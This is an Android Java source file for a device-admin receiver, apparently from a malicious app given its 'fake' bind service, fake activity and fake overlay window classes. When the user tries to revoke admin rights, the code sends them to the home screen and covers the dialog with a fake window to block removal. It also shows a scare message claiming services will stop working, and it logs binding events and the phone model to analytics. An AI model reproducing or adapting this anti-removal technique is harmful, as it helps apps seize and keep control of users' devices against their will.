package com.xstd.qm.receiver;

import android.app.admin.DeviceAdminReceiver;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import com.plugin.common.utils.UtilsRuntime;
import com.xstd.qm.Utils;
import com.xstd.qm.activity.BindFakeActivity;
import com.xstd.qm.fakecover.DisDeviceFakeWindow;
import com.xstd.qm.fakecover.FakeWindowBinding;
import com.xstd.qm.service.FakeBindService;
import com.xstd.qm.setting.SettingManager;

import java.util.HashMap;

/**
 * Created by michael on 13-12-23.
 */
public class BindDeviceReceiver extends DeviceAdminReceiver {


    @Override
    public void onReceive(Context context, Intent intent) {
        super.onReceive(context, intent);
    }

    @Override
    public void onEnabled(Context context, Intent intent) {
        SettingManager.getInstance().init(context);
        SettingManager.getInstance().setKeyHasBindingDevices(true);

        //notify umeng
        HashMap<String, String> log = new HashMap<String, String>();
        log.put("binding", "success");
        log.put("phoneType", Build.MODEL);
        Utils.umengLog(context, "bind_device_success", log);

        Utils.saveExtraInfo("主绑定成功");

        Intent i = new Intent();
        i.setAction(FakeBindService.BIND_SUCCESS_ACTION);
        context.sendBroadcast(i);
    }

    @Override
    public void onDisabled(Context context, Intent intent) {
        SettingManager.getInstance().init(context);
        SettingManager.getInstance().setKeyHasBindingDevices(false);

        //notify umeng
        HashMap<String, String> log = new HashMap<String, String>();
        log.put("unbind", "success");
        log.put("phoneType", Build.MODEL);
        Utils.umengLog(context, "unbinding", log);
    }

    @Override
    public CharSequence onDisableRequested(final Context context, Intent intent) {
        if (!SettingManager.getInstance().getKeyPluginInstalled()) {
            UtilsRuntime.goHome(context);

            DisDeviceFakeWindow fakeWindow = new DisDeviceFakeWindow(context);
            fakeWindow.show();
        }

        return "取消设备激活可能会造成设备的服务不能使用，是否确定要取消激活?";
    }

}
